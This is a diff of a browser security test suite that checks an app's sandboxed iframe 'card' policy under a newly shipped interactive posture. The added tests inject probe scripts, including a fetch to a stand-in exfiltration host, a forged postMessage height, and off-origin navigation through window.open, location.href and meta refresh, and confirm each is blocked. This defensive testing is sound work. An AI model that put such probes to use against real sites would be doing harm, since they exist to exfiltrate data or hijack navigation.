@@ -263,9 +263,9 @@ test("hostile themeTokens are dropped at the boundary, not smuggled into the src
 // is the same `sandbox` value `CARD_FRAME_SANDBOX.document` carries. Every off-origin target is routed, so
 // "did it navigate" is a request that either arrives or does not — never an inference from a screenshot.
 //
-// The last test runs a LAB policy that grants `script-src 'unsafe-inline'`. That string is built HERE, in
-// the test, and NOTHING in `@orb/kit/card-frame` moves: it is the measurement leg 3 needs (what a card
-// could reach for once it can run code), taken without shipping the grant.
+// The last two tests run the INTERACTIVE posture. When leg 2 measured them that policy was a lab string
+// built in this file; since the leg-3 security pass it is the SHIPPED policy, so they now build it from
+// `buildCardFrameCsp(…, "interactive")` and the measurement and the product are the same bytes.
 
 const PARENT_URL = "/__leg2-card-parent";
 const EXTERNAL_URL = "https://leg2-external.test/landing";
@@ -278,14 +278,9 @@ const BARRIER_URL = "/__leg2-barrier";
  *  to `'self'`; `form-action 'self'`; `base-uri 'self'`; `object-src 'none'`). */
 const APP_PARENT_CSP = "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; base-uri 'self'; form-action 'self'; object-src 'none'";
 
-/** The LAB policy — today's routed policy with `script-src` widened to `'unsafe-inline'`. Built in the test
- *  ON PURPOSE: it is what leg 3 would ship, so leg 3 can read a measurement instead of an argument. */
-function labInteractiveCsp(): string {
-  return buildCardFrameCsp(CARD_FRAME_SAFE_FLOOR, "document", "static").replace(
-    `script-src ${CARD_FRAME_HEIGHT_SCRIPT_CSP_HASH}`,
-    "script-src 'unsafe-inline'",
-  );
-}
+/** The SHIPPED interactive policy (#111 leg 3). Was a lab string built by string-replace in leg 2; it is
+ *  the engine's own output now, so every navigation negative below is measured against the real bytes. */
+const INTERACTIVE_CARD_CSP = buildCardFrameCsp(CARD_FRAME_SAFE_FLOOR, "document", "interactive");
 
 /** The CONTROL parent policy: identical except that frames may navigate anywhere. If a vector lands here
  *  and not under {@link APP_PARENT_CSP}, the app's `default-src 'self'` is what stopped it — and if it
@@ -410,12 +405,11 @@ test("LEG 2 — a card META REFRESH off-origin is BLOCKED (and it needs no scrip
   expect(probe.hits).toEqual([]);
 });
 
-// ── THE LAB ARM: the same measurement with `script-src 'unsafe-inline'` — i.e. what leg 3 would ship. The
-//    policy string is built HERE and nothing in `@orb/kit/card-frame` moves; this is a measurement of the
-//    proposed grant, not the grant. Split in two on purpose: a script-driven SELF navigation blanks the
-//    frame to `about:blank` when Chromium refuses it, which would race any in-document marker.
+// ── THE INTERACTIVE POSTURE, re-run against the SHIPPED policy (#111 leg 3). Split in two on purpose: a
+//    script-driven SELF navigation blanks the frame to `about:blank` when Chromium refuses it, which would
+//    race any in-document marker.
 
-test("LEG 2 LAB — the grant really RUNS card code, and its top/popup navigation is refused", async ({ page }) => {
+test("LEG 3 — the granted posture really RUNS card code, and its top/popup navigation is still refused", async ({ page }) => {
   const script = [
     "<scr",
     'ipt>document.body.setAttribute("data-lab-ran","1");',
@@ -423,7 +417,7 @@ test("LEG 2 LAB — the grant really RUNS card code, and its top/popup navigatio
     `try{window.open(${JSON.stringify(`${EXTERNAL_URL}?via=open`)});}catch(e){}</scr`,
     "ipt>",
   ].join("");
-  const probe = await serveNavProbe(page, { cardHtml: `<p>lab</p>${script}`, cardCsp: labInteractiveCsp() });
+  const probe = await serveNavProbe(page, { cardHtml: `<p>lab</p>${script}`, cardCsp: INTERACTIVE_CARD_CSP });
   // POSITIVE CONTROL: card-authored code executed under the lab grant (it cannot under today's policy — the
   // sibling hash test proves that), so the empty `hits` is about navigation, not about a dead script.
   await expect(page.frameLocator("#card").locator("body")).toHaveAttribute("data-lab-ran", "1");
@@ -433,9 +427,9 @@ test("LEG 2 LAB — the grant really RUNS card code, and its top/popup navigatio
   expect(page.url()).toContain(PARENT_URL);
 });
 
-test("LEG 2 LAB — a script-driven SELF navigation off-origin is refused exactly like the link is", async ({ page }) => {
+test("LEG 3 — a script-driven SELF navigation off-origin is refused exactly like the link is", async ({ page }) => {
   const script = ["<scr", `ipt>location.href=${JSON.stringify(`${EXTERNAL_URL}?via=self`)};</scr`, "ipt>"].join("");
-  const probe = await serveNavProbe(page, { cardHtml: `<p>lab</p>${script}`, cardCsp: labInteractiveCsp() });
+  const probe = await serveNavProbe(page, { cardHtml: `<p>lab</p>${script}`, cardCsp: INTERACTIVE_CARD_CSP });
   await settleNavigation(page);
   // Nothing was fetched, and the refusal is visible in the frame: Chromium leaves a CSP-blocked frame
   // navigation at an empty `about:blank` document rather than at the card it was showing.
@@ -443,4 +437,143 @@ test("LEG 2 LAB — a script-driven SELF navigation off-origin is refused exactl
   await expect(page.frameLocator("#card").locator("body")).toBeEmpty();
   // SO: granting card scripts adds NO navigation reach a card does not already have with a plain link — the
   // embedder's `default-src 'self'` is the belt in both cases. That is the control #110 asked leg 3 for.
+});
+
+// ══ #111 LEG 3 — THE GRANT ITSELF, PER POSTURE ═════════════════════════════════════════════════════════
+//
+// The string assertions live in `tests/kit/card-frame/index.test.ts`; these are the BROWSER receipts, which
+// are the only ones that can prove a policy does what its bytes say. Three things get proven here, each
+// against the REAL engine output rather than a hand-written policy:
+//   1. an INTERACTIVE card's own script RUNS (a DOM effect inside the frame, not an inference);
+//   2. a TRUSTED (static-posture) card's script is REFUSED, with Chromium's own CSP line as the receipt
+//      (the sibling "refused by the hash" test above, which is the static arm's proof and did not move);
+//   3. the grant buys the card NOTHING else — no eval, no network, no worker, no nested frame, no remote
+//      script — and the height channel it CAN now forge is still clamped.
+
+/** Serve the routed card under an ARBITRARY policy, so a test can name the posture it is measuring. The
+ *  document bytes are always the engine's (`buildCardFrameDocument`), so the height script is real. */
+async function serveRoutedCardUnder(page: Page, html: string, csp: string): Promise<void> {
+  await page.route(ROUTED_URL, async (route) => {
+    await route.fulfill({
+      status: 200,
+      headers: { "content-type": "text/html; charset=utf-8", "content-security-policy": csp },
+      body: buildCardFrameDocument({ html, css: undefined, themeTokens: undefined, fontFamily: undefined }),
+    });
+  });
+}
+
+/** A card script that stamps the body — the positive control every negative in this block leans on. */
+const CARD_MARK = ["<scr", 'ipt>document.body.setAttribute("data-card-ran","1");', "</scr", "ipt>"].join("");
+
+test("LEG 3 GRANT — an INTERACTIVE card's own script RUNS: the DOM effect lands inside the frame", async ({ mount, page }) => {
+  await serveRoutedCardUnder(page, `<div style="height:100px">card</div>${CARD_MARK}`, INTERACTIVE_CARD_CSP);
+  const cmp = await mount(<SandboxFrame html="<p>x</p>" title="interactive card" src={ROUTED_URL} />);
+  const frame = await (await cmp.elementHandle())?.contentFrame();
+  if (frame === null || frame === undefined) {
+    throw new Error("routed iframe has no content frame — the navigation never completed");
+  }
+  // THE grant receipt. Under the static posture this exact assertion fails (proven by the hash test above),
+  // so the pair of them is the capability delta stated from both sides.
+  await expect(frame.locator("body")).toHaveAttribute("data-card-ran", "1");
+});
+
+test("LEG 3 GRANT — our height script still measures under the grant, with no second allowance", async ({ mount, page }) => {
+  // `'unsafe-inline'` REPLACES the hash, so the measurement script rides the grant rather than needing its
+  // own source. If it ever stopped running here, an interactive card would silently regress to the 320px
+  // slab #91 exists to kill — and no string assertion in the kit suite could see that.
+  await serveRoutedCardUnder(page, '<div style="height:120px">short</div>', INTERACTIVE_CARD_CSP);
+  const cmp = await mount(<SandboxFrame html="<p>x</p>" title="short interactive card" src={ROUTED_URL} />);
+  await expect.poll(async () => frameHeight(cmp)).toBe(120);
+});
+
+test("LEG 3 — 'unsafe-inline' BESIDE the hash grants NOTHING: Chromium ignores it when a hash is present", async ({ mount, page }) => {
+  // The measurement that decided the grant's SHAPE. CSP3: the keyword is skipped whenever the source list
+  // carries a nonce- or hash-source. So `script-src 'unsafe-inline' 'sha256-…'` — the obvious "keep our
+  // script AND allow theirs" spelling — refuses the card outright, and would have shipped a grant that read
+  // live and did nothing. This is the fixture for that whole dead-opt-in class; it is built HERE precisely
+  // because the engine must never emit it.
+  const errors: string[] = [];
+  page.on("console", (message) => {
+    if (message.type() === "error") {
+      errors.push(message.text());
+    }
+  });
+  const bothCsp = STATIC_CARD_CSP.replace(`script-src ${CARD_FRAME_HEIGHT_SCRIPT_CSP_HASH}`, `script-src 'unsafe-inline' ${CARD_FRAME_HEIGHT_SCRIPT_CSP_HASH}`);
+  await serveRoutedCardUnder(page, `<div style="height:100px">card</div>${CARD_MARK}`, bothCsp);
+  const cmp = await mount(<SandboxFrame html="<p>x</p>" title="both-sources card" src={ROUTED_URL} />);
+  const frame = await (await cmp.elementHandle())?.contentFrame();
+  if (frame === null || frame === undefined) {
+    throw new Error("routed iframe has no content frame — the navigation never completed");
+  }
+  // The card body parsed (so this is about EXECUTION, not a document that never loaded)…
+  await expect(frame.locator("div")).toHaveText("card");
+  // …and the script did not run, even though 'unsafe-inline' is right there in the policy.
+  await expect(frame.locator("body")).not.toHaveAttribute("data-card-ran", "1");
+  // Chromium says why, in as many words. Quoting the browser is what makes this a measurement.
+  const refusal = errors.find((line) => line.includes("violates the following Content Security Policy directive"));
+  expect(refusal).toContain("'unsafe-inline' is ignored if either a hash or nonce value is present");
+});
+
+test("LEG 3 — the granted card can reach NOTHING new: no network, no eval, no worker, no nested frame, no remote script", async ({ mount, page }) => {
+  // Every arm runs INSIDE the grant (the positive control below proves the script executed), so each `false`
+  // is a real refusal rather than dead code. `default-src 'none'` is what closes the network family — there
+  // is no `connect-src` in the policy on either posture, deliberately — and `script-src 'unsafe-inline'`
+  // matches no URL, which is what refuses a remote script and a blob worker via the worker-src fallback.
+  const probe = [
+    "<scr",
+    "ipt>window.__reach={};",
+    'const t=(k,f)=>{try{f();window.__reach[k]="allowed";}catch(e){window.__reach[k]="refused:"+e.name;}};',
+    't("eval",()=>{eval("1+1");});',
+    't("newFunction",()=>{new Function("return 1")();});',
+    't("blobWorker",()=>{new Worker(URL.createObjectURL(new Blob(["1"],{type:"text/javascript"})));});',
+    't("cookie",()=>{void document.cookie;});',
+    't("localStorage",()=>{void localStorage.length;});',
+    't("parentDom",()=>{void parent.document.title;});',
+    'fetch("https://leg3-exfil.test/x").then(()=>{window.__reach.fetch="allowed";},(e)=>{window.__reach.fetch="refused:"+e.name;});',
+    'document.body.setAttribute("data-card-ran","1");</scr',
+    "ipt>",
+  ].join("");
+  await serveRoutedCardUnder(page, `<p>reach</p>${probe}`, INTERACTIVE_CARD_CSP);
+  const cmp = await mount(<SandboxFrame html="<p>x</p>" title="reach card" src={ROUTED_URL} />);
+  const frame = await (await cmp.elementHandle())?.contentFrame();
+  if (frame === null || frame === undefined) {
+    throw new Error("routed iframe has no content frame — the navigation never completed");
+  }
+  await expect(frame.locator("body")).toHaveAttribute("data-card-ran", "1"); // the positive control
+  await expect
+    .poll(async () => await frame.evaluate(() => (globalThis as { __reach?: Record<string, string> }).__reach ?? {}))
+    .toMatchObject({
+      // No runtime code generation: the grant lets a card SHIP code, never BUILD it.
+      eval: "refused:EvalError",
+      newFunction: "refused:EvalError",
+      // The opaque origin, which is what `sandbox` without `allow-same-origin` buys.
+      cookie: "refused:SecurityError",
+      localStorage: "refused:SecurityError",
+      parentDom: "refused:SecurityError",
+      // The exfil belt.
+      fetch: "refused:TypeError",
+    });
+});
+
+test("LEG 3 — an interactive card CAN forge the height message, and the clamp is what holds", async ({ mount, page }) => {
+  // Under the static posture the hash refuses the forgery outright (the sibling test proves that). Under the
+  // grant the card really does get to `postMessage`, so the clamp stops being defence-in-depth and becomes
+  // THE defence: the worst a card buys itself is the cap, which it could already occupy with tall content.
+  const forge = ["<scr", 'ipt>parent.postMessage({orbCardFrameHeight:99999},"*");</scr', "ipt>"].join("");
+  await serveRoutedCardUnder(page, `<div style="height:100px">card</div>${forge}`, INTERACTIVE_CARD_CSP);
+  const cmp = await mount(<SandboxFrame html="<p>x</p>" title="forging card" src={ROUTED_URL} />);
+  await expect.poll(async () => frameHeight(cmp)).toBe(CARD_FRAME_MAX_HEIGHT_PX);
+  await settle(page);
+  expect(await frameHeight(cmp)).toBe(CARD_FRAME_MAX_HEIGHT_PX);
+});
+
+test("LEG 3 — meta refresh is unchanged by the grant: still refused, and it never needed a script", async ({ page }) => {
+  // Re-run of the leg-2 today-vector under the GRANTED policy, because "the grant changes nothing here" is
+  // a claim about the interactive posture and leg 2 only measured the static one.
+  const probe = await serveNavProbe(page, {
+    cardHtml: `<meta http-equiv="refresh" content="0;url=${EXTERNAL_URL}"><p>refreshing</p>`,
+    cardCsp: INTERACTIVE_CARD_CSP,
+  });
+  await settleNavigation(page);
+  expect(probe.hits).toEqual([]);
 });
